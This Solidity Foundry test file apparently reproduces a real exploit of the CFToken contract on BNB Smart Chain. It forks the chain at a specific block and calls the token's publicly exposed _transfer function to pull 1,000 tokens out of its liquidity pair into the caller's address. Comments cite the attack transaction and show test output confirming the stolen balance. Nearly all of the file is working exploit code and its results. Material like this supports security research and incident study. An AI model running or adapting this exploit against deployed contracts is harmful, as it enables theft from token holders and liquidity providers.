// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// source
// https://mp.weixin.qq.com/s/_7vIlVBI9g9IgGpS9OwPIQ
// attack tx: 0xc7647406542f8f2473a06fea142d223022370aa5722c044c2b7ea030b8965dd0
// test result

// > forge test --contracts ./src/cftoken_exp.sol -vv
// [⠘] Compiling...
// No files changed, compilation skipped

// Running 2 tests for test/Counter.t.sol:CounterTest
// [PASS] testIncrement() (gas: 28334)
// [PASS] testSetNumber(uint256) (runs: 256, μ: 27476, ~: 28409)
// Test result: ok. 2 passed; 0 failed; finished in 16.14ms

// Running 1 test for src/cftoken_exp.sol:ContractTest
// [PASS] testExploit() (gas: 86577)
// Logs:
//   Before exploit, cftoken balance:: 0
//   After exploit, cftoken balance:: 930000000000000000000

// Test result: ok. 1 passed; 0 failed; finished in 9.72s%

contract ContractTest is Test {
    address private cftoken = 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196;
    address private cfpair = 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 16_841_980); //fork bsc at block 16841980
    }

    function testExploit() public {
        emit log_named_uint("Before exploit, cftoken balance:", ICFToken(cftoken).balanceOf(address(msg.sender)));

        ICFToken(cftoken)._transfer(cfpair, payable(msg.sender), 1_000_000_000_000_000_000_000);

        emit log_named_uint("After exploit, cftoken balance:", ICFToken(cftoken).balanceOf(address(msg.sender)));
    }
}
